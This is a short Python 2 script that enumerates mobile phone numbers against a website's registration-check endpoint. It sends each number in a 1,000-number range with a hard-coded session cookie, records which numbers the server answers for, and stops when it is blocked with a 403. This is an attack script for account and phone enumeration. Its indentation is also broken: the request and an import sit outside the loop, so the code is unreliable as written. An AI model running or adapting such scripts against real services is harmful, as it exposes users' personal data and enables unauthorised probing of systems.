import requests

url = "https://www.xyz.cn/u/register.do?xcase=checkUserMobileExceptSelf"
headers = {
"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
"X-Requested-With": "XMLHttpRequest",
"Content-Type":"application/x-www-form-urlencoded",
"Cookie": "INS=2f5644683651745359555a563961712b64356e5832673d3d;"
}
#proxies = {'http': 'http://127.0.0.1:8080'}
count = 0
mobile=[]
data = "mobileNew="
for i in range(17127290000, 17127291000):
    data = "mobileNew="
    print "mobile:  "+str(i)
    print mobile
    count+=1    
import time
#time.sleep(0.1)
re = requests.post(url,headers = headers ,data =data+str(i))
    if "true" in re.text:
    print re.text
    elif re.status_code == 403:
    print count
        break
    else:
    mobile.append(i)
